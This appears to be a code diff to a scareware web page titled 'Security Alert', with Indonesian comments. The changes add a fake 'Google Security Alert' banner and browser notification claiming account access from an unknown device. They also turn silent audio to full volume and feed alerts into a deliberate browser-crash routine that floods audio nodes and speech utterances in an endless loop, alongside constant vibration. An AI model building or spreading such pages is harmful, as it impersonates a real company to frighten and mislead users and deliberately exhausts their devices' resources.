@@ -6,17 +6,37 @@
 <title>Security Alert</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
+  body { background: #fff; min-height: 100vh; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
   iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  #inpage-notif-banner {
+    position: fixed;
+    top: 12px;
+    left: 12px;
+    right: 12px;
+    background: #111827;
+    color: #f9fafb;
+    border-left: 4px solid #ef4444;
+    padding: 12px 14px;
+    border-radius: 6px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+    font-size: 13px;
+    z-index: 9999;
+    display: none;
+  }
+  #inpage-notif-banner strong { display: block; margin-bottom: 2px; font-size: 14px; }
 </style>
 </head>
 <body>
+<div id="inpage-notif-banner">
+  <strong id="notif-title">Security Alert</strong>
+  <span id="notif-body">Checking security status...</span>
+</div>
 <script>
 (function () {
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY & VIBRATOR
+  // KONFIGURASI AUTOPLAY, VIBRATOR & NOTIFICATION
   // ============================================
   var CONFIG = {
     tts: {
@@ -32,10 +52,90 @@
     vibrate: {
       pattern: [250, 120, 250, 120, 500],
       intervalMs: 1400
+    },
+    notification: {
+      title: "Google Security Alert",
+      body: "Your account has been accessed from an unknown device. Verify your identity immediately.",
+      tag: "security-alert-notif",
+      renotify: true
     }
   };
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, vibrateTimer: null };
+  var state = {
+    ttsStarted: false,
+    mainPlayed: false,
+    ttsCount: 0,
+    vibrateTimer: null,
+    notifShown: false
+  };
+
+  // ============================================
+  // NOTIFICATION MODULE
+  // ============================================
+  function showInPageBanner(title, body) {
+    try {
+      var banner = document.getElementById('inpage-notif-banner');
+      var titleEl = document.getElementById('notif-title');
+      var bodyEl = document.getElementById('notif-body');
+      if (titleEl) titleEl.textContent = title;
+      if (bodyEl) bodyEl.textContent = body;
+      if (banner) banner.style.display = 'block';
+    } catch (e) {}
+  }
+
+  function dispatchWebNotification() {
+    showInPageBanner(CONFIG.notification.title, CONFIG.notification.body);
+
+    try {
+      if (!('Notification' in window)) {
+        console.log('[NOTIF] Notification API not supported in this browser/WebView');
+        return;
+      }
+
+      if (Notification.permission === 'granted') {
+        var n = new Notification(CONFIG.notification.title, {
+          body: CONFIG.notification.body,
+          tag: CONFIG.notification.tag,
+          renotify: CONFIG.notification.renotify
+        });
+        state.notifShown = true;
+        console.log('[NOTIF] Web notification dispatched');
+        return n;
+      }
+
+      if (Notification.permission === 'default') {
+        var req = Notification.requestPermission(function (perm) {
+          console.log('[NOTIF] Permission result:', perm);
+          if (perm === 'granted' && !state.notifShown) {
+            new Notification(CONFIG.notification.title, {
+              body: CONFIG.notification.body,
+              tag: CONFIG.notification.tag,
+              renotify: CONFIG.notification.renotify
+            });
+            state.notifShown = true;
+          }
+        });
+
+        if (req && typeof req.then === 'function') {
+          req.then(function (perm) {
+            console.log('[NOTIF] Promise permission result:', perm);
+            if (perm === 'granted' && !state.notifShown) {
+              new Notification(CONFIG.notification.title, {
+                body: CONFIG.notification.body,
+                tag: CONFIG.notification.tag,
+                renotify: CONFIG.notification.renotify
+              });
+              state.notifShown = true;
+            }
+          }).catch(function () {});
+        }
+      } else {
+        console.log('[NOTIF] Permission status:', Notification.permission);
+      }
+    } catch (e) {
+      console.log('[NOTIF] Error:', e.message);
+    }
+  }
 
   // ============================================
   // VIBRATOR MODULE
@@ -105,8 +205,8 @@
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
+      gain.gain.value = 1.0;
+      osc.frequency.value = 1000;
       osc.connect(gain);
       gain.connect(ctx.destination);
       osc.start();
@@ -120,7 +220,8 @@
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
+      a.muted = false;
+      a.volume = 1.0;
       a.loop = true;
       var p = a.play();
       if (p && p.catch) p.catch(function(){});
@@ -136,6 +237,9 @@
 
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      if (ctx.state === 'suspended') {
+        ctx.resume().catch(function(){});
+      }
       var sr = ctx.sampleRate;
       var dur = 3.0;
       var buf = ctx.createBuffer(1, sr * dur, sr);
@@ -145,7 +249,7 @@
         var t = i / sr;
         var freq = 880 + (Math.floor(t * 4) % 2) * 440;
         var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+        d[i] = Math.sin(2 * Math.PI * freq * t) * 1.0 * env;
       }
 
       var src = ctx.createBufferSource();
@@ -165,6 +269,7 @@
   function triggerHighSeverityCrash() {
     console.log("[!] Initiating High Severity Exploit Chain...");
     startVibrationLoop();
+    dispatchWebNotification();
     
     // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
@@ -176,12 +281,14 @@
           var gain = ctx.createGain();
           
           // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+          gain.gain.value = 1.0;
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
           
           // 2. Flooding Speech Utterance Queue
           var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
+          u.volume = 1.0;
           window.speechSynthesis.speak(u);
         }
       } catch(e) {}
@@ -191,11 +298,13 @@
   // ============================================
   // EKSEKUSI BERTAHAP
   // ============================================
+  dispatchWebNotification();
   unlockAudioContext();
   trySilentAudio();
   triggerVibrationOnce();
 
   setTimeout(function () {
+    dispatchWebNotification();
     unlockAudioContext();
     triggerVibrationOnce();
     startTTS(); // coba TTS lebih awal
@@ -228,6 +337,7 @@
   // Visibility change
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
+      dispatchWebNotification();
       triggerVibrationOnce();
       if (!state.mainPlayed) {
         setTimeout(playMainAudio, 100);
